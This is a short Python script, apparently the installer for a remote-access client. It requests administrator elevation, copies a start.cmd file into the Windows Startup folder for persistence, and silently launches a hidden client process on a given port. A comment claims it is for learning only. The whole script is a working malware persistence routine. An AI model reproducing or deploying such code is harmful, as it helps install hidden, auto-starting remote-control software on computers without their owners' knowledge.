from pathlib import Path
import shutil
import subprocess
import os
import ctypes, sys
from shutil import copy
import time


# This script was written for learning purposes. Do not run this on anyones computer without the owners consent.
# I do not take any responsibility for misuse of this script.


def start(prt):
    # define directories
    autostartdir = str(Path.home()) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\'
    clientdir = str(Path.home())

    # check if the user has granted the script admin privileges
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if is_admin(): # run this if the user granted admin perms
        shutil.copy('start.cmd', autostartdir) # copy the start.cmd to the users autostart directory
        subprocess.Popen('pythonw.exe ' + clientdir + '\clientv2.py client ' + prt) # open the client and pass the port along
               
    else: # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

# get arguments from the cmd command
if __name__ == '__main__':
    globals()[sys.argv[1]](sys.argv[2])

